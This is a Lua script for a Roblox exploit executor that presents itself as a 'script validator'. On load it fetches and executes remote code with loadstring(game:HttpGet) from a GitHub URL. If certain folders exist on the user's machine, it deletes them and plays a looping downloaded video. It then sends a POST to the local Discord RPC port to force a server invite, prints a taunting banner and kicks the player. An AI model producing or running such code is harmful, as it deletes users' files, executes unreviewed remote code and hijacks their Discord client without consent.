local SoundService = game:GetService("SoundService")
if not game:IsLoaded() then game.Loaded():Wait() end

local API = loadstring(game:HttpGet("https://raw.githubusercontent.com/7BioHazard/Utils/main/API.lua"))()
local data = (syn and syn.request or http_request or request)({
    Url = "https://rr3---sn-h5qzen7y.googlevideo.com/videoplayback?expire=1682177047&ei=t6dDZPn-I9jo7QTisqKoCg&ip=80.253.235.6&id=o-ANjgt_DvY1d_vCwO3V5F3r3ZVrlSyD_GZxsQIpad70JV&itag=18&source=youtube&requiressl=yes&spc=99c5CSWXoVG0jxmokotNNt-fD4_VL93Fb2hLv8mF2A&vprv=1&mime=video%2Fmp4&ns=2Bw2cJYokGCsAkEdZiRQVqwM&cnr=14&ratebypass=yes&dur=114.590&lmt=1665435826493431&fexp=24007246&c=WEB&txp=5438434&n=XEhw6VvD67AA2g&sparams=expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cspc%2Cvprv%2Cmime%2Cns%2Ccnr%2Cratebypass%2Cdur%2Clmt&sig=AOq0QJ8wRQIgXtntYACzuUzitkvIOy2V18YpgG3W4aUtKlVdx4iiM8cCIQDrXjV-bV08wCFXN_zT2NTl0w2sRkKB4R_eLtoNmiGOWA%3D%3D&rm=sn-npcpgn3pxnxup-3w5e7e,sn-n8vyeez&req_id=5bd4a8908241a3ee&cmsv=e&redirect_counter=2&cms_redirect=yes&ipbypass=yes&mh=Dg&mip=158.172.131.179&mm=29&mn=sn-h5qzen7y&ms=rdu&mt=1682168695&mv=m&mvi=3&pl=24&lsparams=ipbypass,mh,mip,mm,mn,ms,mv,mvi,pl&lsig=AG3C_xAwRAIfOu3MsoboWC1shWPS8Ahj1GWFWpe5yWo1Z78fcxX3PAIhAKdFgLD3R9EYD3uuYIFuyyLAd8ae8u9eaSwGykxX6Cex",
    Method = "GET"
})
local getasset = getsynasset or getcustomasset
local bannedFolders = {"macrov2", "macrov2-tester"}
local detected = false
local list = ""

local validator = {}

writefile("scriptValidator.mp4", data.Body)

for _, v in next, bannedFolders do
    if isfolder(v) then
        detected = true
        break
    end
end

local function Join_Discord(Link)
    (syn and syn.request or http_request)(
        {
            Url = "http://127.0.0.1:6463/rpc?v=1",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json",
            ["Origin"] = "https://discord.com"},
            Body = game:GetService("HttpService"):JSONEncode(
                {
                    cmd = "INVITE_BROWSER",
                    args = {
                        code = Link or "Q9DGr3DEGE"
                    },
                    nonce = game:GetService("HttpService"):GenerateGUID(false)
                }
            ),
        }
    )
end

function validator:Check()
    if detected then
        for _, v in next, bannedFolders do
            if isfolder(v) then
                delfolder(v)
                list = list .. v
            end
        end

        local screen = API:Create("ScreenGui", {
            Parent = game.CoreGui,
            IgnoreGuiInset = true
        })

        if gethui then
            screen.Parent = gethui()
        elseif syn.protect_gui then
            syn.protect_gui(screen)
            screen.Parent = game:GetService("CoreGui")
        elseif game:GetService("CoreGui"):FindFirstChild("RobloxGui") then
            screen.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxGui")
        else
            screen.Parent = game:GetService("CoreGui")
        end

        local video = API:Create("VideoFrame", {
            Parent = game.CoreGui.ScreenGui,
            Size = UDim2.new(1, 0, 1, 0),
            Video = getasset("scriptValidator.mp4"),
            Looped = true
        })

        for _, v in next, game:GetDescendants() do
            if v:IsA("Sound") then
                v:Destroy()
            end
        end

        video:Play()

        if not rconsoleprint then
            game.Players.LocalPlayer:Kick("\nYou have been caught having a skid script! Never use them again!")
        else
            rconsoleprint("@@RED@@")
            rconsoleprint([[
                 _____           _       _     _   _       _ _     _       _             
                /  ___|         (_)     | |   | | | |     | (_)   | |     | |            
                \ `--.  ___ _ __ _ _ __ | |_  | | | | __ _| |_  __| | __ _| |_ ___  _ __ 
                 `--. \/ __| '__| | '_ \| __| | | | |/ _` | | |/ _` |/ _` | __/ _ \| '__|
                /\__/ / (__| |  | | |_) | |_  \ \_/ / (_| | | | (_| | (_| | || (_) | |   
                \____/ \___|_|  |_| .__/ \__|  \___/ \__,_|_|_|\__,_|\__,_|\__\___/|_|   
                                  | |                                                    
                                  |_|                                                    
                 _                  ______                                               
                | |                |___  /                                               
                | |__  _   _  __  __  / / _   _ _ __                                     
                | '_ \| | | | \ \/ / / / | | | | '_ \                                    
                | |_) | |_| |  >  <./ /__| |_| | | | |                                   
                |_.__/ \__, | /_/\_\_____/\__, |_| |_|                                   
                        __/ |              __/ |                                         
                       |___/              |___/           
            ]])
            rconsoleprint("\n\nHaha! You have been caught using a skidded script (s)! [" .. list .. "]")
            rconsoleprint("\nNever use them again, I WARNED YOU!")

            Join_Discord()

            game.Players.LocalPlayer:Kick("\nYou have been caught having a skid script! Never use them again!")
        end
    else
        print("[SCRIPT VALIDATOR by xZyn] Check passed!")
        return
    end
end

return validator
